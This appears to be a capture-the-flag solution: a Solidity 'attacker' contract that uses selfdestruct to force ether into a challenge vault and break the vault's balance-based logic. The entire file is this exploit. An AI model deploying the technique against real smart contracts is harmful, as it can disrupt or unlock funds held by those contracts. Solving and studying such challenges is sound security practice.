// SPDX-License-Identifier:GPL-3.0-or-later
pragma solidity 0.7.6;

contract WeirdVaultChallengeAttacker {
    receive() external payable {}
    function destruct(address payable _weirdVaultAddress) external {
        selfdestruct(_weirdVaultAddress);
    }
}
